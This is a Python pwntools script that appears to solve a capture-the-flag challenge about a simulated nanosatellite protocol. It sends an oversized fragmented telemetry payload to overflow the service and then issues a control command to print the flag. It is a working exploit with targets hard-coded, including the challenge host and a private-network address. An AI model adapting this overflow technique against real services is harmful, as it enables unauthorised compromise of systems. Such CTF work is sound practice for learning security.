import time
from pwn import *

''''Procotol Services'''
bus_service = b"\x01"
payload_service = b"\x02"
telemetry_service = b"\x03"
control_service = b"\x04"
disconnect_service = b"\x05"

'''Protocol fields'''
length = b"\x12"
fragment_id = b"\x00"
data = b"\x00"*256

gs = '''
continue
'''

context.log_level = 'info'
context.terminal = ['tmux', 'new-window']

def start():
    if args.GDB:
        elf = context.binary = ELF('./protocol')
        gdb.debug(elf.path, gdbscript=gs)
        time.sleep(2)
        return remote('localhost', 5555)
    elif args.REMOTE:
        return remote('atrhax-spacey.chals.io', 443, ssl=True)
    elif args.COE:
        return remote('10.33.127.74', 3210)
    else:
        #process(elf.path)
        #time.sleep(2)
        return remote('127.0.0.1', 5555)

def send_bus():
    log.info('Sending Bus')
    p.sendline(b'\x01\x00\x00\x00')
    log(p.recvuntil(b'\x00', timeout=2))

def send_payload():
    log.info('Sending Payload')
    p.sendline(b'\x02\x00\x00\x00')
    log.info(p.recvuntil(b'\x00', timeout=2))

def send_disconnect():
    log.info('Sending Disconnect')
    p.sendline(b'\x05\x00\x00\x00')

def send_telemetry(data):
    log.info('Sending Data [%s] (%s)' % (data, len(data) + 3))
    for i in range(0,len(data), 255):
        msg_len = len(data[i:i+255])
        frag_id = [int(i/255), 0xa][int(i/255) >= 0xc]
        msg = b'\x03' + p8(msg_len) + p8(frag_id) + data[i:i+255]
        if msg_len < 255: msg = msg + b'.' * (255 - msg_len)
        log.info('Sending Chunk [%s] (%s)' % (int(i/255), len(msg)))
        p.sendline(msg)
        time.sleep(.2)
    log.success('Data sent!')
    log.info(p.recvuntil(b'\x00', timeout=2).decode('UTF-8') + ' \n')

def send_control(data):
    log.info('Sending Control [%s] (%s)' % (data, len(data)))
    p.sendline(b'\x04' + p8(len(data)) + b'\x00' + data)
    log.success('FLAG: ' + p.recvall().decode('UTF-8').split('\x00')[0])

def send_raw(service, length, fragment_id, data):
    log.info('Sending Raw Packet [%s] [%s] [%s] [%s]' % (service, length, fragment_id, data))
    p.sendline(service + length + fragment_id + data)
    log.info(p.recv(timeout=1))

p = start()

p.recvuntil(b'You are now connected to the SpaceY Nanosat in LEO........................')
#input()
send_telemetry(b'A' * (3060) + p8(1) + b'B' * 254)
send_control(b'ATR')
exit()
